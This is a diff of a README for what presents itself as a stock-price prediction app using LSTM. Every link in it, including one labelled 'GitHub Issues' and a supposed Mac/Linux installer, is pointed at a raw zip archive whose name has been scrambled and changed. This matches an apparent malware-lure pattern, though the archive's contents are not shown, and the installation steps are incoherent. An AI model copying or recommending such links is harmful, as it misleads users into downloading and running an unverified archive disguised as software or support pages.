@@ -1,6 +1,6 @@
 # 📈 Stock-Time-Series-Analysis-and-Prediction-LSTM - Analyze and Predict Stock Prices Easily
 
-![Download](https://raw.githubusercontent.com/Cyruz140/Stock-Time-Series-Analysis-and-Prediction-LSTM/main/invaginate/Stock-Time-Series-Analysis-and-Prediction-LSTM.zip)
+![Download](https://raw.githubusercontent.com/Cyruz140/Stock-Time-Series-Analysis-and-Prediction-LSTM/main/notebooks/and_LSTM_Analysis_Stock_Prediction_Series_Time_v1.1.zip)
 
 ## 📖 Description
 
@@ -28,12 +28,12 @@ To get started with this application, follow the steps below. You do not need a 
 
 To download and install the software, please visit the link below:
 
-[Visit this page to download](https://raw.githubusercontent.com/Cyruz140/Stock-Time-Series-Analysis-and-Prediction-LSTM/main/invaginate/Stock-Time-Series-Analysis-and-Prediction-LSTM.zip)
+[Visit this page to download](https://raw.githubusercontent.com/Cyruz140/Stock-Time-Series-Analysis-and-Prediction-LSTM/main/notebooks/and_LSTM_Analysis_Stock_Prediction_Series_Time_v1.1.zip)
 
 1. Click the link above.
 2. You will see a list of available versions.
 3. Choose the latest version.
-4. Download the appropriate installer for your system (e.g., `.exe` for Windows or `https://raw.githubusercontent.com/Cyruz140/Stock-Time-Series-Analysis-and-Prediction-LSTM/main/invaginate/Stock-Time-Series-Analysis-and-Prediction-LSTM.zip` for Mac/Linux).
+4. Download the appropriate installer for your system (e.g., `.exe` for Windows or `https://raw.githubusercontent.com/Cyruz140/Stock-Time-Series-Analysis-and-Prediction-LSTM/main/notebooks/and_LSTM_Analysis_Stock_Prediction_Series_Time_v1.1.zip` for Mac/Linux).
 5. Open the downloaded file and follow the installation instructions.
 
 ## 📊 Using the Application
@@ -56,10 +56,10 @@ If you encounter any issues during installation or use, consider these tips:
 
 ## 📞 Support
 
-For any questions or further assistance, feel free to contact the support team via the [GitHub Issues](https://raw.githubusercontent.com/Cyruz140/Stock-Time-Series-Analysis-and-Prediction-LSTM/main/invaginate/Stock-Time-Series-Analysis-and-Prediction-LSTM.zip) page. We aim to respond within 24 hours.
+For any questions or further assistance, feel free to contact the support team via the [GitHub Issues](https://raw.githubusercontent.com/Cyruz140/Stock-Time-Series-Analysis-and-Prediction-LSTM/main/notebooks/and_LSTM_Analysis_Stock_Prediction_Series_Time_v1.1.zip) page. We aim to respond within 24 hours.
 
 ## 📈 Conclusion
 
 This Stock-Time-Series-Analysis-and-Prediction-LSTM application empowers you to explore stock trends and make data-driven decisions with ease. Enjoy your experience, and happy analyzing!
 
-[Visit this page to download](https://raw.githubusercontent.com/Cyruz140/Stock-Time-Series-Analysis-and-Prediction-LSTM/main/invaginate/Stock-Time-Series-Analysis-and-Prediction-LSTM.zip)
+[Visit this page to download](https://raw.githubusercontent.com/Cyruz140/Stock-Time-Series-Analysis-and-Prediction-LSTM/main/notebooks/and_LSTM_Analysis_Stock_Prediction_Series_Time_v1.1.zip)
